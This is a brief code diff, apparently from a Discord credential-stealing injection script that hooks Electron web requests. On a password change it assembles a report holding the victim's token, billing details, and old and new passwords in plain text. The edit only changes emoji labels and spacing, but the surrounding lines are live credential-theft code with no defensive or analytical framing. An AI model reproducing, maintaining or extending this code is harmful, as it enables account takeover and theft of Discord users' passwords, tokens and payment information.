@@ -480,8 +480,9 @@ session.defaultSession.webRequest.onCompleted({
                     'Discord — Password Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
-                        `<:token:1533639840254660640> **Old Password:** \`${data.password}\``,
-                        `<:token:1533639840254660640> **New Password:** \`${data.new_password}\``,
+                        `<:eksi:1533734509235798097> **Old Password:** \`${data.password}\``,
+                        ``,
+                        `<:arti:1533734612906414120> **New Password:** \`${data.new_password}\``,
                     ]),
                     avatar || AVATAR_URL, banner || null
                 ));
